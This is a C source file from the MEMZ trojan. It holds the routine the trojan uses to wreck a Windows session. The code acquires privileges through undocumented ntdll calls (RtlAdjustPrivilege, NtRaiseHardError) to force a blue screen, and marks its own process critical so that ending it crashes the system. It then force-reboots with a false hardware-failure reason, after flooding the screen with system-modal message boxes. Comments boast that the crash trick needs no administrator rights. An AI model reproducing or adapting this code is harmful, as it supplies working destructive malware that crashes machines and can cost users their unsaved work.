#include "../MEMZ.h"
#include <reason.h>

#ifndef CLEAN

#ifndef SE_SHUTDOWN_PRIVILEGE
#define SE_SHUTDOWN_PRIVILEGE 19L
#endif
#ifndef SE_DEBUG_PRIVILEGE
#define SE_DEBUG_PRIVILEGE 20L
#endif
#define ProcessBreakOnTermination 29

DWORD WINAPI ripMessageThread(LPVOID parameter);

void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	long int (*NtSetInformationProcess)(HANDLE, int, void *, unsigned long int);
	*(FARPROC *)&NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_SHUTDOWN_PRIVILEGE, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
	if(RtlAdjustPrivilege && NtSetInformationProcess) {
		unsigned char old_value;
		unsigned long int critical = 1;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_DEBUG_PRIVILEGE, 1, 0, &old_value);
		NtSetInformationProcess((void *)-1, ProcessBreakOnTermination, &critical, sizeof critical);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, 0, NULL);
		Sleep(100);
	}

	killWindowsInstant();
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)KillMessages[random() % KillMessagesLen], "WinMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
#endif
